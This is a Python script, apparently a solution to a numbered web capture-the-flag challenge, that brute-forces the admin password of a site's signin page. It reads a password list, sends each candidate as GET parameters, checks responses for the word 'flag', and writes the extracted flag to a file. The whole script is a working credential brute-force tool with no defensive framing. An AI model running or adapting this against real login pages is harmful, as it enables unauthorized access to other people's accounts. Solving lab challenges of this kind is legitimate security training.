import requests
import json
import asyncio
import sys
from bs4 import BeautifulSoup


def get_flag(content):
    flag = None

    with open('../flag', 'w') as f:
        try:
            flag = BeautifulSoup(content, 'html.parser').find('h2').text.split(':')[-1].strip()
            f.write(flag+'\n')
        except Exception as e:
            print(e.args)

    return flag


def brute(host_name, file):
    with open(file) as f:
        passwds = f.read().splitlines()

    headers = {'User-Agent': 'Mozilla/5.0 (X11; Linux x86_64…) Gecko/20100101 Firefox/67.0'}
    session = requests.Session()
    session.get('http://{host}/?page=signin'.format(host=host_name), data=json.dumps(headers))

    print('\nBrute Force Attack:'.upper())
    for passwd in passwds:
        params = {
            'page': 'signin',
            'username': 'admin',
            'password': passwd,
            'Login': 'Login'
        }
        response = session.get('http://'+host_name, params=params)
        print('flag' in response.content.decode('utf-8'), 'Username: {username}\tPassword: {password}'.format(**params))
        if 'flag' in response.content.decode('utf-8'):
            return get_flag(response.content.decode('utf-8'))


def check_host_name(host_name):
    return requests.get('http://'+host_name).status_code == 200


if __name__ == '__main__':
    try:
        host_name = sys.argv[1]
        file = sys.argv[2] if len(sys.argv) == 3 else 'passwords.txt'

        if check_host_name(host_name):
            print(f"13 : {brute(host_name, file)} - brute force http://{host_name}/?page=signin/")
        else:
            raise Exception('Incorrect host name')
    except Exception as e:
        print(e.args)
